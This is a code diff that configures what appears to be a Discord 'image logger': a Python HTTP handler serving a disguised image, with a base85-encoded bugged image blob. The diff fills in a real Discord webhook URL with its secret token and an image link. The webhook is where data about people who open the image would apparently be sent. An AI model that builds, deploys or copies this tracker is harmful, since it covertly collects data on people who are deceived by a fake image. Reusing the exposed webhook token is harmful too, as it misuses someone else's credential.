@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'WEBHOOK'
+webhook = 'https://discord.com/api/webhooks/993097385096003594/vzkDzbAmoJNFl-7VYAGSCQmjxPdp4Y_AuapGVOJ9kRC4zPQgwNl8_DSJDqqQlrQbTe0g'
 
-bindata = httpx.get('link to image here').content
+bindata = httpx.get('https://cdn.discordapp.com/attachments/748203333327650959/992486956455960627/IMG_20220701_204830.jpg').content
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
